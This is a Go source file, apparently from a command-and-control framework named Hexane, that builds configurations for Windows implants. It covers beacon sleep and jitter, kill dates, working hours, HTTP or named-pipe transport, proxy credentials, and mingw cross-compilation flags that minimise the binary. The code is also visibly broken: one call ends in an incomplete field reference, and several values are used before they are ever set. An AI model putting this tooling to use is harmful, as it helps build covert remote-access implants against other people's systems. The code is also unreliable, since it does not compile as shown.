package core

import (
	"encoding/json"
	"fmt"
	"os"
	"strings"
)

var (
	Debug        = false
	ShowCommands = false

	Cb       = make(chan Callback)
	Payloads = new(HexanePayloads)
	Servers  = new(ServerList)
	Session  = &HexaneSession{
		Username: "lemur",
		Admin:    true,
	}
)

var (
	FstatCreate = os.O_WRONLY | os.O_CREATE | os.O_TRUNC
	FstatWrite  = os.O_WRONLY | os.O_APPEND
	FstatRW     = os.O_RDWR | os.O_APPEND
)

var ModuleStrings = []string{
	"crypt32",
	"winhttp",
	"advapi32",
	"iphlpapi",
}

func (h *HexaneConfig) GetTransportType() (string, error) {

	switch h.ImplantCFG.ProfileTypeId {
	case TRANSPORT_HTTP:
		return "TRANSPORT_HTTP", nil
	case TRANSPORT_PIPE:
		return "TRANSPORT_PIPE", nil
	default:
		return "", fmt.Errorf("transport type was not defined")
	}
}

func (h *HexaneConfig) GetEmbededStrings(strList []string) []byte {
	var stream = new(Stream)

	stream.PackString(string(h.Key))

	if h.ImplantCFG.ProfileTypeId == TRANSPORT_HTTP {
		stream.PackDword(1)
	} else if h.ImplantCFG.ProfileTypeId == TRANSPORT_PIPE {
		stream.PackDword(0)
	}

	stream.PackDword(1) // Ctx->LE == TRUE

	for _, str := range strList {
		stream.PackString(str)
	}

	return stream.Buffer
}

func GetModuleConfig(cfgName string) (*JsonObject, error) {
	var (
		err    error
		buffer []byte
		module *JsonObject
	)

	if buffer, err = os.ReadFile(cfgName); err != nil {
		return nil, err
	}

	if err = json.Unmarshal(buffer, &module); err != nil {
		return nil, err
	}

	module.ConfigName = cfgName
	module.IncludeDirectories = append(module.IncludeDirectories, RootDirectory)

	return module, nil
}

func (h *HexaneConfig) GenerateConfigBytes() error {
	key := CryptCreateKey(16)
	patch, err := h.PePatchConfig()
	if err != nil {
		return err
	}

	h.Key = key
	h.ConfigBytes = patch // Assuming XteaCrypt(patch) if needed.
	return nil
}

func (h *HexaneConfig) CreateConfig(jsonCfg Json) error {
	var err error

	h.CompilerCFG = new(CompilerConfig)
	h.ImplantCFG = new(ImplantConfig)
	WrapMessage("INF", fmt.Sprintf("generating config for %s", h.CompilerCFG.FileExtension))

	h.Config.ImplantName = jsonCfg.ImplantName
	h.CompilerCFG.BuildDirectory = fmt.Sprintf("../payload/%s", strings.TrimSuffix(h.ImplantName, h.CompilerCFG.FileExtension))

	h.CompilerCFG.Debug = jsonCfg.Config.Debug
	h.CompilerCFG.Arch = jsonCfg.Config.Arch
	h.CompilerCFG.Ar = "/usr/bin/x86_64-w64-mingw32-ar"
	h.CompilerCFG.Mingw = "/usr/bin/x86_64-w64-mingw32-g++"
	h.CompilerCFG.Linker = "/usr/bin/x86_64-w64-mingw32-ld"
	h.CompilerCFG.Objcopy = "/usr/bin/x86_64-w64-mingw32-objcopy"
	h.CompilerCFG.Windres = "/usr/bin/x86_64-w64-mingw32-windres"
	h.CompilerCFG.Strip = "/usr/bin/x86_64-w64-mingw32-strip"
	h.CompilerCFG.Assembler = "/usr/bin/nasm"

	h.ImplantCFG.LoadedModules = []string{
		"crypt32",
		"winhttp",
		"advapi32",
		"iphlpapi",
		".reloc",
	}

	if jsonCfg.Config.Debug {
		h.CompilerCFG.Flags = []string{
			"",
			"-std=c++23",
			"-g -Os -nostdlib -fno-asynchronous-unwind-tables -masm=intel",
			"-fno-ident -fpack-struct=8 -falign-functions=1",
			"-ffunction-sections -fdata-sections -falign-jumps=1 -w",
			"-falign-labels=1 -fPIC",
			"-Wl,-s,--no-seh,--enable-stdcall-fixup,--gc-sections",
		}
	} else {
		h.CompilerCFG.Flags = []string{
			"",
			"-std=c++23",
			"-Os -nostdlib -fno-asynchronous-unwind-tables -masm=intel",
			"-fno-ident -fpack-struct=8 -falign-functions=1",
			"-ffunction-sections -fdata-sections -falign-jumps=1 -w",
			"-falign-labels=1 -fPIC",
			"-Wl,--no-seh,--enable-stdcall-fixup,--gc-sections",
		}
	}

	return err
}

func ReadConfig(cfgName string) error {
	var (
		jsn    Json
		buffer []byte
		err    error
	)

	hexane := new(HexaneConfig)

	WrapMessage("INF", fmt.Sprintf("loading %s", cfgName))
	if buffer, err = os.ReadFile(RootDirectory + "json/" + cfgName); err != nil {
		return err
	}

	if err = json.Unmarshal(buffer, &jsn); err != nil {
		return err
	}

	if err = hexane.CreateConfig(jsn); err != nil {
		return err
	}

	hexane.PeerId = GeneratePeerId()
	hexane.ImplantCFG.Sleeptime = uint32(jsn.Config.Sleeptime)
	hexane.ImplantCFG.Jitter = uint32(jsn.Config.Jitter)

	if hexane.ImplantCFG.Hostname = jsn.Config.Hostname; hexane.ImplantCFG.Hostname == "" {
		return fmt.Errorf("a hostname must be provided")
	}

	switch jsn.Network.ProfileType {
	case "http":
	case "smb":
	default:
		return fmt.Errorf("unknown network profile type")
	}

	if jsn.Builder != nil {
		if jsn.Builder.Loader != nil {
		}
	} else {
		return fmt.Errorf("a build definition needs to be provided")
	}

	hexane.UserSession = Session
	return hexane.RunBuild()
}

func (h *HexaneConfig) PePatchConfig() ([]byte, error) {
	var (
		stream = CreateStream()
		Hours  int32
		err    error
	)

	if Hours, err = ParseWorkingHours(h.ImplantCFG.WorkingHours); err != nil {
		return nil, err
	}

	stream.PackDword(h.PeerId)
	stream.PackInt32(Hours)
	stream.PackString(h.ImplantCFG.Hostname)
	stream.PackString(h.ImplantCFG.Domain)
	stream.PackDword(h.ImplantCFG.Sleeptime)
	stream.PackDword(h.ImplantCFG.Jitter)
	stream.PackDword64(h.ImplantCFG.Killdate)

	switch h.ImplantCFG.ProfileTypeId {
	case TRANSPORT_HTTP:
		{
			var httpCfg = h.ImplantCFG.Profile.(*HttpConfig)

			stream.PackWString(httpCfg.Useragent)
			stream.PackWString(httpCfg.Address)
			stream.PackDword(uint32(httpCfg.Port))

			if len(httpCfg.Endpoints) == 0 {
				stream.PackDword(1)
				stream.PackWString("/")

			} else {
				stream.PackDword(uint32(len(httpCfg.Endpoints)))
				for _, uri := range httpCfg.Endpoints {
					stream.PackWString(uri)
				}
			}
			if h.ImplantCFG.ProxyBool {
				var proxyUrl = fmt.Sprintf("%v://%v:%v", h.ProxyCFG.Proto, h.ProxyCFG.Address, h.ProxyCFG.Port)

				stream.PackDword(1)
				stream.PackWString(proxyUrl)
				stream.PackWString(h.ProxyCFG.Username)
				stream.PackWString(h.ProxyCFG.Password)

			} else {
				stream.PackDword(0)
			}

			break
		}
	case TRANSPORT_PIPE:
		{
			stream.PackWString(h.ServerCFG.)
		}
	}
	return stream.Buffer, err
}
